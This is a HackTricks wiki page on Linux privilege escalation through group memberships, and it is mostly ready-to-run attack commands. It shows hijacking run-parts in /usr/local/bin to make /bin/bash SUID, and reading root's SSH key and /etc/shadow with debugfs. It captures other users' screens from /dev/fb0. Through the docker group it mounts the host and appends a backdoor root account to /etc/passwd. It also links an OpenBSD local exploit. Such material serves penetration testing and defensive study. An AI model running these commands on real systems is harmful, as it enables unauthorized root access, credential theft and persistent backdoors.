# Interesting Groups - Linux Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Sudo/Admin Groups

### **PE - Method 1**

**Sometimes**, **by default (or because some software needs it)** inside the **/etc/sudoers** file you can find some of these lines:

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.

If this is the case, to **become root you can just execute**:

```
sudo su
```

### PE - Method 2

Find all suid binaries and check if there is the binary **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

If you find that the binary **pkexec is a SUID binary** and you belong to **sudo** or **admin**, you could probably execute binaries as sudo using `pkexec`.\
This is because typically those are the groups inside the **polkit policy**. This policy basically identifies which groups can use `pkexec`. Check it with:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

There you will find which groups are allowed to execute **pkexec** and **by default** in some linux disctros the groups **sudo** and **admin** appear.

To **become root you can execute**:

```bash
pkexec "/bin/sh" #You will be prompted for your user password
```

If you try to execute **pkexec** and you get this **error**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel Group

**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:

```
%wheel	ALL=(ALL:ALL) ALL
```

This means that **any user that belongs to the group wheel can execute anything as sudo**.

If this is the case, to **become root you can just execute**:

```
sudo su
```

## Shadow Group

Users from the **group shadow** can **read** the **/etc/shadow** file:

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

So, read the file and try to **crack some hashes**.

## Staff Group

**staff**: Allows users to add local modifications to the system (`/usr/local`) without needing root privileges (note that executables in `/usr/local/bin` are in the PATH variable of any user, and they may "override" the executables in `/bin` and `/usr/bin` with the same name). Compare with group "adm", which is more related to monitoring/security. [\[source\]](https://wiki.debian.org/SystemGroups)

In debian distributions, `$PATH` variable show that `/usr/local/` will be run as the highest priority, whether you are a privileged user or not.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

If we can hijack some programs in `/usr/local`, we can easy to get root.

Hijack `run-parts` program is a way to easy to get root, because most of program will run a `run-parts` like (crontab, when ssh login).

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

or When a new ssh session login.

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Group

This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.

Files:`/dev/sd[a-z][1-9]`

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:

```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

However, if you try to **write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.

## Video Group

Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.

The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

To **open** the **raw image** you can use **GIMP**, select the \*\*`screen.raw` \*\* file and select as file type **Raw image data**:

![](<../../../.gitbook/assets/image (463).png>)

Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):

![](<../../../.gitbook/assets/image (317).png>)

## Root Group

It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...

**Check which files root members can modify**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

You can **mount the root filesystem of the host machine to an instance’s volume**, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```

Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd Group

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm Group

Usually **members** of the group **`adm`** have permissions to **read log** files located inside _/var/log/_.\
Therefore, if you have compromised a user inside this group you should definitely take a **look to the logs**.

## Auth group

Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.\
These permissions may be abused with the following exploit to **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
